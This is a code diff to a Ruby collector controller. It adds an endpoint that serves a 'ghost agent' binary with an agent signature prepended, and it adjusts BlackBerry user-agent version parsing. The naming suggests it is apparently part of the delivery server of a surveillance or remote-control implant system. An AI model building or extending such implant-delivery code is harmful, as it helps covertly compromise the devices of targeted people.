@@ -1,4 +1,3 @@
-
 require_relative 'protocol'
 
 require 'rcs-common/mime'
@@ -15,6 +14,20 @@ module Collector
 class CollectorController < RESTController
   
   def get
+    # search for a ghost request: /gh/build_id/instance_id
+    if /^\/gh\/\d+\/[[:xdigit:]]+$/ =~ @request[:uri]
+      root, gh, build_id, instance_id = @request[:uri].split('/')
+      ghost = DB.instance.ghost_agent(build_id, instance_id)
+      unless ghost.nil?
+        trace :info, "[#{@request[:peer]}] ghost agent available, sending #{ghost.bytesize} bytes"
+
+        # prepend the auth to the exe
+        auth = DB.instance.agent_signature + SecureRandom.random_bytes(16)
+
+        return ok(auth + ghost, {content_type: 'binary/octetstream'})
+      end
+    end
+
     # serve the requested file
     return http_get_file(@request[:headers], @request[:uri])
   rescue Exception => e
@@ -236,7 +249,7 @@ class CollectorController < RESTController
     if user_agent['BlackBerry']    
       major = 4
       minor = 5
-      ver_tuple = user_agent.scan(/Version\/(\d+)\.(\d+)/).flatten
+      ver_tuple = user_agent.scan(/\/(\d+)\.(\d+)\.\d+/).flatten
       major, minor = ver_tuple unless ver_tuple.empty?
       if major.to_i >= 5
         version = "5.0"
